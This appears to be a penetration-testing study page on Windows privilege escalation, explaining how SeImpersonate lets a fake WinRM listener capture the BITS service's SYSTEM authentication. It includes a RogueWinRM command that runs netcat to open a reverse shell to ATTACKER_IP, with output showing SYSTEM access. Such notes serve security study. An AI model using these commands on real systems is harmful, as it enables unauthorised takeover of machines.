---
sidebar_position: 3
---

# SeImpersonate - SeAssignPrimaryToken

:::info Scenario

We have already compromised a Website running on `IIS` and Planted a **Web-Shell && Uploaded `RogueWinRM`**

:::

---

<br/>


- These Privileges <b style={{ color: 'Brown' }}>[SeAssignPrimaryToken - SeImpersonate]</b> allow a Process to Impersonate other Users and act on their behalf.

```log
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
// highlight-start             
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
// highlight-end
```

<br/>

---

<div class="alert alert--danger" role="alert">EXPLOIT EXPLANATION</div>

<br/>


- `RogueWinRM` Exploit is possible because whenever a User **(Including Unprivileged Users)** starts the `BITS Service` **(Background Intelligent Transfer Service)** in Windows, it Automatically creates a Connection to `[PORT 5985]` using <b style={{ color: 'Red' }}>SYSTEM</b> Privileges.


- `[PORT 5985]` Typically used for the `WinRM Service` **(Windows Remote Management),** which is simply a Port that exposes a **Powershell** console to be used Remotely through the Network **(Similar to SSH).**


- If `WinRM Service` isn't Running on the Target Machine, an Attacker can start a **Fake WinRM Service** on `[Port 5985]` and catch the Authentication attempt made by the `BITS Service` when starting. If the attacker has <b style={{ color: 'Red' }}>SeImpersonate</b> Privileges, he can execute any Command on behalf of the Connecting User, which is <b style={{ color: 'Red' }}>SYSTEM</b>.

---

<br/>

- Using <b style={{ color: 'Coral' }}>RogueWinRM</b> Exploit.
- <b style={{ color: 'Red' }}>[NOTE]</b> <span style={{fontWeight: 'Bold'}}>The Exploit may take up to 2 Minutes to Work.</span> This happens if we run the Exploit Multiple Times as it must wait for the BITS Service to Stop before Starting it again. <span style={{fontWeight: 'Bold'}}>[The BITS Service will Stop Automatically after 2 Minutes]</span> 

```log
C:\> RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
Listening for Connection on Port 5985 ....
Received HTTP negotiate request
Sending the 401 HTTP Response with NTLM type 2 Challange
Received HTTP Packet with NTLM type 3 Response
Using NTLM type 3 Response in AcceptSecurityContext()

BITS Triggered!
[+] Authresult 0
NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW Ok
```

```bash
attacker@machine:~$ nc -lvp 4442
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\> whoami
NT AUTHORITY\SYSTEM
```